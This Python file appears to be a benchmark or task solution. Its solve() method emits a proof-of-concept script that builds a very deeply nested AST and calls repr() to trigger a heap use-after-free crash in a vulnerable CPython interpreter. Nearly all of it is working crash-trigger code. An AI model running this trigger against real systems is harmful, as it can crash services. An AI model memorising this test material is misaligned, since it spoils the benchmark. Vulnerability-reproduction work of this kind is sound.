import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr().
        
        The vulnerability is triggered by invoking repr() on a deeply nested AST structure.
        During the recursive generation of the string representation, the internal buffer 
        may be reallocated. If the implementation holds a pointer to the old buffer across 
        recursive calls, a Use-After-Free occurs.
        
        We generate a Python script that:
        1. Sets a high recursion limit.
        2. Programmatically constructs a deeply nested AST (using UnaryOp for density).
        3. Calls repr() on the AST.
        4. Catches RecursionError to ensure the fixed version exits with code 0.
        """
        
        # The Python script to be used as the PoC input
        poc_script = r'''import sys
import ast

# Increase recursion limit to allow deep recursion in repr()
sys.setrecursionlimit(1000000)

def main():
    try:
        # Construct a deeply nested AST to stress the repr() implementation.
        # We use UnaryOp(USub, ...) which generates "UnaryOp(op=USub(), operand=...)"
        # This creates a large output string and deep recursion stack.
        # 50,000 iterations is sufficient to trigger buffer reallocations and stack issues.
        node = ast.Constant(value=1)
        for _ in range(50000):
            node = ast.UnaryOp(op=ast.USub(), operand=node)
            
        # Calling repr() on the node triggers the vulnerable C code path.
        # In the vulnerable version, this causes a crash (UAF/Segfault).
        repr(node)
        
    except RecursionError:
        # The fixed version typically raises RecursionError safely when depth limit is hit.
        # We catch it to ensure a zero exit code for the fixed version.
        pass
    except Exception:
        # Catch other potential non-fatal errors
        pass

if __name__ == "__main__":
    main()
'''
        return poc_script.encode('utf-8')
